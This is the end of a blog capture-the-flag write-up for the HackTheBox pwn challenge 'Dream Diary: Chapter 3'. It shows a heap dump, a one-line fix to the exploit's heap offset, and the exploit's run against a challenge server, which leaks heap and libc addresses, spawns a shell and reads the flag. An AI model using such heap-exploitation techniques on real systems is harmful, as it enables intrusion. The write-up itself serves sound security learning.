+0x55555555b250  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000411</span>      <span class="code-dark-magenta">................</span>
+0x55555555b260  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x55555555b270  <span class="code-dark-magenta">0x203a797261694420</span>      <span class="code-dark-magenta">0x2072657470616843</span>      <span class="code-dark-magenta"> Diary: Chapter</span>
+0x55555555b280  <span class="code-dark-magenta">0x2065685420202133</span>      <span class="code-dark-magenta">0x6f206e7275746572</span>      <span class="code-dark-magenta">3!  The return o</span>
+0x55555555b290  <span class="code-dark-magenta">0x6165724420612066</span>      <span class="code-dark-magenta">0x207972616944206d</span>      <span class="code-dark-magenta">f a Dream Diary</span>
+0x55555555b2a0  <span class="code-dark-magenta">0x646f6d2068746977</span>      <span class="code-dark-magenta">0x746f7270206e7265</span>      <span class="code-dark-magenta">with modern prot</span>
+0x55555555b2b0  <span class="code-dark-magenta">0x21736e6f69746365</span>      <span class="code-dark-magenta">0x000000000000000a</span>      <span class="code-dark-magenta">ections!........</span>
+0x55555555b2c0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+...
+0x55555555b640  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x55555555b650  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x55555555b660  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x00000000000209a1</span>      <span class="code-dark-green">................</span>         &lt;-- Top chunk
+</code></pre></div><p>So, this minor modification on the exploit will do the trick:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">-=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">410</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk6">0</span>  
+</code></pre></div><p>Now we can get a shell on the remote instance and read the flag with the above tricks:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.104.91:31413
+[<span class="code-blue">*</span>] './diary3'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./'</span>
+[<span class="code-green">+</span>] Opening connection to 134.122.104.91 on port 31413: Done
+[<span class="code-blue">*</span>] Heap base address: 0x55bab1eb9000
+[<span class="code-green">+</span>] Glibc base address: 0x7fc444794000
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> echo *
+bin cant_guess_me_f14G.txt dev diary3 ld-2.29.so lib lib64 libc.so.6 start.sh  
+<span class="code-red">$</span> while read line; do echo $line; done &lt; cant_guess_me_f14G.txt
+HTB{m0d3rN_Nu11_bYT3+s3cC0mP_b1@Ck1i5t1Ng=&gt;n0t_s0_S@f3!!!}
+</code></pre></div><p>The full exploit script can be found in here: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Dream%20Diary%3A%20Chapter%203/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#seccomp-rules"><code>seccomp</code> rules</a></li><li><a href="#program-options">Program options</a></li><li><a href="#allocation-function">Allocation function</a></li><li><a href="#edit-function">Edit function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#show-function">Show function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#null-byte-poisoning">Null byte poisoning</a></li><li><a href="#rop-chain">ROP chain</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
